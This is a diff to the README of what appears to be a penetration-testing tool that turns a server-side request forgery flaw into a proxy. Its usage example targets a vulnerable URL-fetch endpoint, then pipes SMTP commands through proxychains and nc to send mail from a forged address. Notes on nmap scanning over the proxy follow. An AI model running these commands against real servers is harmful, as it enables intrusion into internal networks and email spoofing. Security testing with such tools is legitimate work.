@@ -17,10 +17,11 @@ Limitations:
 
 Example:
 
-  $ ./ssrfproxy "http://victim.com/openurl?url="
-  listener ready on port 65432
+    $ ./ssrfproxy "http://victim.com/openurl?url="
+    listener ready on port 65432
 
-  $ echo -e "HELO localhost\nMAIL FROM:paul@victim.com\nRCPT TO: paul@ultramegaman.com\nDATA\nSubject: test\n\nthis is a test\n.\nQUIT\n" | proxychains nc 127.0.0.1 25
+    $ echo -e "HELO localhost\nMAIL FROM:root@victim.com\nRCPT TO: root@ultramegaman.com\nDATA\nSubject: test\n\nthis is a test\n.\nQUIT\n" \
+      | proxychains nc 127.0.0.1 25
 
   In the above scenario, it's necessary to configure proxychains.conf:
   
@@ -32,3 +33,8 @@ Testing:
   Currently, the SOCKS4A code is untested, as proxychains doesn't seem to
   support it. I found limited success with running nmap over this proxy, as 
   nmap reports closed ports as open, and some open ports as closed.
+  
+  This script was tested against a vulnerable app that passed a user-controlled
+  value to code that treated the value as a URI, fetched it, and returned the
+  result. It's likely not usable against XXE vulnerabilities without some
+  modification.
